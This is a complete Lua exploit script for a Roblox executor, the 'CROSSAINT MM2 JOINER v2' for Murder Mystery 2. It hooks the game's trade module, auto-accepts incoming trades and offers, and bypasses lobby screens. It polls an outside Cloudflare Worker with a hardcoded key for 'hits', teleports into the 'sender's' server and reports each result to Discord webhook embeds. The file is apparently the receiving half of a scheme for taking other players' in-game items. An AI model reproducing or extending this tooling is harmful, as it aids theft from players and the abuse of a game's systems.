-- CROSSAINT MM2 JOINER v2
-- Fixed: watch mode scope bugs, duplicate logic, hit connection

local function geniter(f, s, c)
    if type(f) ~= "function" then
        local mt = getmetatable(f)
        if type(mt) == "table" and mt.__iter then
            f, s, c = mt.__iter(f)
        elseif type(f) == "table" then
            f, s, c = next, f, nil
        end
    end

    return function()
        local r = table.pack(f(s, c))
        if r[1] == nil then return false end
        c = r[1]
        return true, table.unpack(r, 1, r.n)
    end
end

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local Players           = game:GetService("Players")
local TeleportService   = game:GetService("TeleportService")
local HttpService       = game:GetService("HttpService")
local UserInputService  = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui           = game:GetService("CoreGui")
local ContentProvider   = game:GetService("ContentProvider")

-- ── API base ──────────────────────────────────────────────────────────────────
-- Project Velo — Cloudflare Worker URL
-- Replace YOUR_SUBDOMAIN with your actual workers.dev subdomain
-- or set getgenv().MM2_AJ_API_BASE before running to override
local CF_WORKER_URL = "https://crossaint-hub-25.velohubmm2.workers.dev"

if not getgenv().MM2_AJ_API_BASE then
    getgenv().MM2_AJ_API_BASE = CF_WORKER_URL
end

local API_BASE        = getgenv().MM2_AJ_API_BASE
local URL_STATUS      = API_BASE .. "/mm2-client2-status"
local URL_COMPLETE    = API_BASE .. "/complete-hit"
local URL_LEFT        = API_BASE .. "/player-left"
local URL_PATCH       = API_BASE .. "/patch-embed"
local JOINER_KEY      = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"

local LocalPlayer = Players.LocalPlayer
local Name        = LocalPlayer.Name

-- ── JobId capture ─────────────────────────────────────────────────────────────
local function captureJobId()
    local ok, result = pcall(gethiddenproperty, game, "JobId")
    if ok and type(result) == "string" and result ~= "" and result ~= "00000000-0000-0000-0000-000000000000" then
        return result
    end

    local ok2, result2 = pcall(getproperties, game)
    if ok2 and result2 and type(result2.JobId) == "string" and result2.JobId ~= "" then
        return result2.JobId
    end

    return game.JobId
end

getgenv().JOBID = captureJobId()

print("[CROSSAINT] Waiting for JobID...")
while not getgenv().JOBID do task.wait() end

local JOBID = getgenv().JOBID
print("[CROSSAINT] JobId: " .. JOBID)
print("[CROSSAINT] game.JobId: " .. game.JobId)

-- ── UI button fire helper ─────────────────────────────────────────────────────
local BUTTON_EVENTS = { "MouseButton1Click", "MouseButton1Down", "Activated" }

local function fireButton(btn)
    if not btn then return end

    for _, evName in pairs(BUTTON_EVENTS) do
        local ev = btn[evName]
        if ev then
            local iter = geniter(pairs(getconnections(ev)))
            local ok, _, conn = iter()
            while ok do
                pcall(function() conn.Function() end)
                ok, _, conn = iter()
            end
        end
    end
end

-- ── preload remotes ───────────────────────────────────────────────────────────
task.spawn(function()
    local remotes = {}
    for _, d in ipairs(ReplicatedStorage:GetDescendants()) do
        if d:IsA("RemoteFunction") or d:IsA("RemoteEvent") then
            table.insert(remotes, d)
        end
    end
    pcall(ContentProvider.PreloadAsync, ContentProvider, remotes)
end)

-- ── bypass mobile device select / lobby ───────────────────────────────────────
task.spawn(function()
    repeat
        task.wait(1)
        pcall(function()
            fireButton(LocalPlayer.PlayerGui.DeviceSelect.Container.Phone.Button)
        end)
        pcall(function()
            fireButton(LocalPlayer.PlayerGui.Join.Friends.Play)
        end)
    until LocalPlayer.PlayerGui:FindFirstChild("MainGUI")
end)

-- ── MM2 trade module hook ─────────────────────────────────────────────────────
-- hooks UpdateTrade to capture LastOffer value for AcceptTrade calls
local OriginalUpdateTrade = nil
_G.LastOffer = nil

local function hookTradeModule()
    local ok, TradeModule = pcall(function()
        return require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("TradeModule"))
    end)

    if not ok or not TradeModule then return false end
    if type(TradeModule.UpdateTrade) ~= "function" then return false end

    OriginalUpdateTrade = TradeModule.UpdateTrade
    TradeModule.UpdateTrade = function(data)
        pcall(function()
            if type(data) == "table" and data.LastOffer ~= nil then
                _G.LastOffer = data.LastOffer
                print("[CROSSAINT] UpdateTrade hook → LastOffer =", tostring(data.LastOffer))
            end
        end)
        return OriginalUpdateTrade(data)
    end

    return true
end

hookTradeModule()

local function getLastOffer()
    return _G.LastOffer
end

-- ── MM2 trade remote setup ────────────────────────────────────────────────────
local Trade = ReplicatedStorage:WaitForChild("Trade", 15)
if not Trade then
    warn("[CROSSAINT] Trade folder not found — wrong game?")
    return
end

local inTrade    = false  -- StartTrade fired
local tradeDone  = false  -- DeclineTrade or AcceptTrade(true) fired
local acceptDone = false  -- AcceptTrade response received

-- auto-accept incoming trade requests from sender
local SendRequest = Trade:FindFirstChild("SendRequest")
if SendRequest then
    SendRequest.OnClientInvoke = newcclosure(function()
        pcall(function() Trade.AcceptRequest:FireServer() end)
        return true
    end)
end

-- track trade state via RemoteEvents
local StartTrade   = Trade:FindFirstChild("StartTrade")
local DeclineTrade = Trade:FindFirstChild("DeclineTrade")
local AcceptTrade  = Trade:FindFirstChild("AcceptTrade")
local UpdateTrade2 = Trade:FindFirstChild("UpdateTrade")

if StartTrade then
    StartTrade.OnClientEvent:Connect(function()
        inTrade   = true
        tradeDone = false
        acceptDone = false
        print("[CROSSAINT] StartTrade received")
    end)
end

if DeclineTrade then
    DeclineTrade.OnClientEvent:Connect(function()
        inTrade   = false
        tradeDone = true
        print("[CROSSAINT] DeclineTrade received")
    end)
end

if AcceptTrade then
    AcceptTrade.OnClientEvent:Connect(function(completed)
        acceptDone = true
        if completed then
            inTrade   = false
            tradeDone = true
            print("[CROSSAINT] AcceptTrade: trade completed ✓")
        else
            print("[CROSSAINT] AcceptTrade: mid-accept")
        end
    end)
end

if UpdateTrade2 then
    UpdateTrade2.OnClientEvent:Connect(function(data)
        if type(data) == "table" and data.LastOffer ~= nil then
            _G.LastOffer = data.LastOffer
            print("[CROSSAINT] Remote UpdateTrade → LastOffer =", tostring(data.LastOffer))
        end
    end)
end

-- ── trade accept loop ─────────────────────────────────────────────────────────
-- runs independently — fires AcceptTrade when trade is open and offer is stable
task.spawn(function()
    while true do
        task.wait(0.2)

        if not inTrade then continue end

        local offerStart = nil
        local lastSeen   = nil
        local deadline   = tick() + 9  -- 9s max wait for offer

        while inTrade and tick() < deadline do
            if tradeDone then break end

            local offer = getLastOffer()
            if offer and offer ~= 0 then
                if offer ~= lastSeen then
                    lastSeen   = offer
                    offerStart = tick()
                elseif offerStart and tick() - offerStart >= 0.8 then
                    -- offer stable for 0.8s — accept
                    break
                end
            end

            task.wait(0.05)
        end

        if tradeDone then continue end
        if not inTrade then continue end

        local finalOffer = getLastOffer() or 0

        acceptDone = false
        tradeDone  = false

        pcall(function()
            Trade.AcceptTrade:FireServer(game.PlaceId * 3, finalOffer)
            print("[CROSSAINT] AcceptTrade fired — offer:", tostring(finalOffer))
        end)

        -- wait for server response (up to 10s)
        local deadline2 = tick() + 10
        while not acceptDone and not tradeDone and tick() < deadline2 do
            task.wait(0.05)
        end

        if acceptDone then
            print("[CROSSAINT] Accept registered ✓")
        end
    end
end)

-- ── trade status poll loop ────────────────────────────────────────────────────
-- handles auto-accept of incoming requests (GetTradeStatus)
task.spawn(function()
    while true do
        local status = Trade.GetTradeStatus:InvokeServer()

        if status == "StartTrade" then
            -- trade is open but we haven't accepted offer yet — wait or decline stale
            local wait = 0
            while true do
                wait += task.wait(0.1)
                if wait >= 7 then
                    Trade.DeclineTrade:FireServer()
                    print("[CROSSAINT] Stale trade declined")
                    break
                elseif Trade.GetTradeStatus:InvokeServer() ~= "StartTrade" then
                    break
                end
            end
        elseif status == "ReceivingRequest" then
            Trade.AcceptRequest:FireServer()
            print("[CROSSAINT] Auto-accepted incoming request")
        end

        task.wait(0.1)
    end
end)

-- ── http helpers ──────────────────────────────────────────────────────────────
local request_ = (syn and syn.request) or (fluxus and fluxus.request) or http_request or request

-- last error reason for the status label
local lastHttpErr = "none"

local function httpGet(url)
    if not request_ then
        lastHttpErr = "no http func"
        return nil
    end
    local ok, result = pcall(request_, {
        Url     = url,
        Method  = "GET",
        Headers = { ["X-Roblox-Key"] = JOINER_KEY },
    })
    if not ok then
        lastHttpErr = "req error: " .. tostring(result):sub(1, 40)
        return nil
    end
    if not result then
        lastHttpErr = "nil result"
        return nil
    end
    local sc = tonumber(result.StatusCode or result.status or 0) or 0
    if sc == 403 then
        lastHttpErr = "403 auth fail (key wrong?)"
        return nil
    end
    if sc == 0 and not result.Body then
        lastHttpErr = "no body / timeout"
        return nil
    end
    local ok2, data = pcall(HttpService.JSONDecode, HttpService, result.Body or "")
    if not ok2 then
        lastHttpErr = "bad JSON (HTTP " .. sc .. ")"
        return nil
    end
    lastHttpErr = "ok"
    return data
end

local function httpPost(url, body)
    if not request_ then return nil end
    local ok, result = pcall(request_, {
        Url     = url,
        Method  = "POST",
        Headers = {
            ["X-Roblox-Key"]  = JOINER_KEY,
            ["Content-Type"]  = "application/json",
        },
        Body = HttpService:JSONEncode(body),
    })
    if not ok or not result or not result.Body then return nil end
    local ok2, data = pcall(HttpService.JSONDecode, HttpService, result.Body)
    return ok2 and data or nil
end

local function isPlayerInServer(username)
    if not username or username == "" then return false end
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name == username then return true end
    end
    return false
end

local function teleportTo(place_id, job_id)
    local pid = tonumber(place_id)
    if not pid then return "failed" end

    pcall(function() TeleportService:TeleportCancel() end)
    task.wait(0.2)

    for i = 1, 20 do
        local prevJob = game.JobId
        local ok = pcall(function()
            TeleportService:TeleportToPlaceInstance(pid, job_id, LocalPlayer)
        end)

        if not ok then
            return "unavailable"
        end

        task.wait(4)

        if game.JobId ~= prevJob then
            return "success"
        end

        if i < 20 then task.wait(1) end
    end

    return "failed"
end

-- ── hit state ─────────────────────────────────────────────────────────────────
local currentHitId   = nil
local watchStartedAt = nil
local senderSeen     = false

local function resetHitState()
    currentHitId   = nil
    watchStartedAt = nil
    senderSeen     = false
end

local function notifyLeft()
    httpPost(URL_LEFT, { username = Name })
end

local function completeHit(hit_id)
    httpPost(URL_COMPLETE, {
        hit_id    = hit_id,
        username  = Name,
        game_type = "mm2",
    })
    resetHitState()
end

-- Tells the worker to PATCH the Discord embed with a joiner status label.
-- The worker looks up the stored webhook URLs + message IDs for this receiver
-- and fires a Discord PATCH on each one.
local function patchEmbed(joiner_status)
    task.spawn(function()
        pcall(httpPost, URL_PATCH, {
            username      = Name,
            joiner_status = joiner_status,
        })
    end)
end

-- ── anti-idle ─────────────────────────────────────────────────────────────────
task.spawn(function()
    local VU = game:GetService("VirtualUser")
    LocalPlayer.Idled:Connect(function()
        VU:CaptureController()
        VU:ClickButton2(Vector2.new())
    end)
    pcall(function() VU:CaptureController() end)

    while true do
        task.wait(60)
        pcall(function()
            VU:Button1Down(Vector2.new(), CFrame.new())
            task.wait(0.1)
            VU:Button1Up(Vector2.new(), CFrame.new())
        end)
    end
end)

-- ── notify worker when THIS joiner client leaves the server ──────────────────
-- fires when the joiner teleports away or disconnects
LocalPlayer.AncestryChanged:Connect(function()
    if not LocalPlayer:IsDescendantOf(game) then
        pcall(notifyLeft)
    end
end)

game:GetService("Players").PlayerRemoving:Connect(function(p)
    if p == LocalPlayer then
        pcall(notifyLeft)
    end
end)

-- ── GUI setup ─────────────────────────────────────────────────────────────────
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name           = "CrossaintMM2Joiner"
ScreenGui.ResetOnSpawn   = false
ScreenGui.DisplayOrder   = 99999
pcall(function() ScreenGui.Parent = CoreGui end)
if not ScreenGui.Parent then
    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
end

local Frame = Instance.new("Frame")
Frame.Size            = UDim2.new(0, 220, 0, 110)
Frame.Position        = UDim2.new(0, 10, 0, 10)
Frame.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
Frame.BorderSizePixel  = 0
Frame.Parent           = ScreenGui
Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 6)
local stroke = Instance.new("UIStroke", Frame)
stroke.Color = Color3.fromRGB(60, 60, 200); stroke.Thickness = 1

-- drag
local dragging, dragStart, startPos
Frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging  = true
        dragStart = input.Position
        startPos  = Frame.Position
    end
end)
Frame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        Frame.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)

local function mkLabel(text, yOff, color, bold)
    local lbl = Instance.new("TextLabel")
    lbl.Size                = UDim2.new(1, -10, 0, 18)
    lbl.Position            = UDim2.new(0, 8, 0, yOff)
    lbl.BackgroundTransparency = 1
    lbl.Text                = text
    lbl.TextColor3          = color or Color3.fromRGB(220, 220, 220)
    lbl.Font                = bold and Enum.Font.GothamBold or Enum.Font.Gotham
    lbl.TextSize            = bold and 13 or 11
    lbl.TextXAlignment      = Enum.TextXAlignment.Left
    lbl.Parent              = Frame
    return lbl
end

mkLabel("⚡ CROSSAINT MM2 JOINER v2", 5, Color3.fromRGB(80, 150, 255), true)
mkLabel("User: " .. Name, 24, Color3.fromRGB(180, 180, 200))

local lblStatus = mkLabel("Status: Starting...", 42, Color3.fromRGB(220, 220, 220))
local lblAction = mkLabel("Action: —",           60, Color3.fromRGB(150, 220, 255))
local lblTimer  = mkLabel("⏱️ 0s",               78, Color3.fromRGB(200, 200, 255))

local startTime = tick()
task.spawn(function()
    while true do
        task.wait(1)
        local elapsed = tick() - startTime
        local d = math.floor(elapsed / 86400)
        local h = math.floor(elapsed / 3600 % 24)
        local m = math.floor(elapsed / 60 % 60)
        local s = math.floor(elapsed % 60)

        if d > 0 then
            lblTimer.Text = string.format("⏱️ %dd %dh %dm %ds", d, h, m, s)
        elseif h > 0 then
            lblTimer.Text = string.format("⏱️ %dh %dm %ds", h, m, s)
        elseif m > 0 then
            lblTimer.Text = string.format("⏱️ %dm %ds", m, s)
        else
            lblTimer.Text = string.format("⏱️ %ds", s)
        end
    end
end)

local function setStatus(text, color)
    lblStatus.Text       = "Status: " .. text
    lblStatus.TextColor3 = color or Color3.fromRGB(220, 220, 220)
end

local function setAction(text)
    lblAction.Text = "Action: " .. text
end

-- ── startup connectivity check ────────────────────────────────────────────────
task.spawn(function()
    task.wait(1)
    setStatus("🔌 Connecting...", Color3.fromRGB(200, 200, 100))
    local ping = httpGet(API_BASE .. "/health")
    if ping then
        print("[CROSSAINT] ✅ Worker reachable — hits in queue: " .. tostring(ping.hits or 0))
        setStatus("✅ Worker OK", Color3.fromRGB(80, 255, 120))
    else
        warn("[CROSSAINT] ❌ Worker unreachable — " .. lastHttpErr)
        setStatus("❌ Worker down: " .. lastHttpErr, Color3.fromRGB(255, 60, 60))
    end
    task.wait(1.5)
end)

-- ── main poll loop ────────────────────────────────────────────────────────────
task.spawn(function()
    task.wait(3.5)   -- give the connectivity check a moment first
    setStatus("🔍 Polling...", Color3.fromRGB(180, 180, 220))

    while true do
        task.wait(1)

        local statusUrl = URL_STATUS
            .. "?username=" .. HttpService:UrlEncode(Name)
            .. "&job_id="   .. HttpService:UrlEncode(JOBID)

        local data = httpGet(statusUrl)

        if not data then
            setStatus("⚠️ " .. lastHttpErr, Color3.fromRGB(255, 100, 100))
            warn("[CROSSAINT] httpGet failed — " .. lastHttpErr .. " | URL: " .. statusUrl)
            continue
        end

        local action = data.action

        -- ── IDLE ──────────────────────────────────────────────────────────────
        if action == "idle" then
            setStatus("🔍 Polling...", Color3.fromRGB(180, 180, 220))
            setAction("idle")
            resetHitState()
            continue
        end

        -- ── TELEPORT ──────────────────────────────────────────────────────────
        if action == "teleport" then
            -- reset any previous watch state for this new hit
            if currentHitId ~= data.hit_id then
                resetHitState()
                currentHitId = data.hit_id
            end

            if data.job_id == JOBID then
                -- already here
                setStatus("✅ Already in server", Color3.fromRGB(100, 255, 180))
                continue
            end

            setStatus("🚀 Teleporting to " .. (data.sender or "?") .. "...", Color3.fromRGB(80, 255, 120))
            setAction("teleport → " .. tostring(data.job_id):sub(1, 16) .. "…")
            print("[CROSSAINT] 🎯 HIT! Sender:", data.sender, "| Job:", data.job_id)
            patchEmbed("🚀 Teleporting...")

            local result = teleportTo(data.place_id, data.job_id)

            if result == "success" then
                print("[CROSSAINT] ✅ Teleporting — autoexec will resume in new server")
                -- script will restart in new server via autoexec; don't complete hit here
            else
                setStatus("❌ Teleport " .. result .. " — skipping", Color3.fromRGB(255, 80, 80))
                completeHit(data.hit_id)
            end

            continue
        end

        -- ── WATCH ─────────────────────────────────────────────────────────────
        if action == "watch" then
            setAction("watch")

            -- initialise watch timer once per hit
            if currentHitId ~= data.hit_id then
                resetHitState()
                currentHitId   = data.hit_id
                watchStartedAt = tick()
            end

            if not watchStartedAt then
                watchStartedAt = tick()
            end

            local elapsed = tick() - watchStartedAt
            local sender  = data.sender

            -- check if sender is currently in the server
            local senderHere = isPlayerInServer(sender)

            if senderHere then
                -- sender arrived → mark seen
                if not senderSeen then
                    patchEmbed("👀 Watching sender...")
                end
                senderSeen = true
                setStatus("👀 " .. (sender or "?") .. " is trading...", Color3.fromRGB(100, 255, 180))
            elseif senderSeen then
                -- sender WAS here but left → trade done
                setStatus("✅ Sender left — hit complete!", Color3.fromRGB(80, 255, 120))
                print("[CROSSAINT] ✅ Sender left after trade — completing hit")
                completeHit(data.hit_id)
                continue
            else
                -- sender hasn't arrived yet
                setStatus("👀 Waiting for " .. (sender or "?") .. "…", Color3.fromRGB(255, 200, 80))
                print("[CROSSAINT] 👁️ Watch mode — waiting for sender:", sender)
            end

            -- timeout: 90 seconds
            if elapsed >= 90 then
                setStatus("⏰ Watch timeout — giving up", Color3.fromRGB(255, 100, 50))
                print("[CROSSAINT] ⏰ Watch timeout — completing hit as failed")
                completeHit(data.hit_id)
                continue
            end

            continue
        end

        -- unknown action — treat as idle
        setStatus("🔍 Polling...", Color3.fromRGB(180, 180, 220))
        resetHitState()
    end
end)

print("[CROSSAINT] ⚡ Crossaint MM2 Joiner v2 — loaded")
print("[CROSSAINT] 🖱️  GUI is draggable")
print("[CROSSAINT] API: " .. API_BASE)
